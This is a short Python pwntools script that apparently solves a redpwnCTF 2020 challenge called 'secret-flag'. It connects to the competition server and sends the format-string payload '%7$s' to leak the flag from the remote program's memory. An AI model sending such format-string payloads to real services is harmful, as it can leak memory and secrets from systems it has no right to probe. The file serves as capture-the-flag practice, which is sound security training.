from pwn import *
import time
conn = remote('2020.redpwnc.tf', 31826)
a = 7
while True:
	#conn = process('./secret-flag')
	p = conn.recvline()
	#print(p)
	p = conn.recvline()
	#print(p)
	strin = f"%{a}$s"
	print(f"string is {strin}")
	conn.sendline(strin)
	print(conn.recvline())
	conn.close()
	break
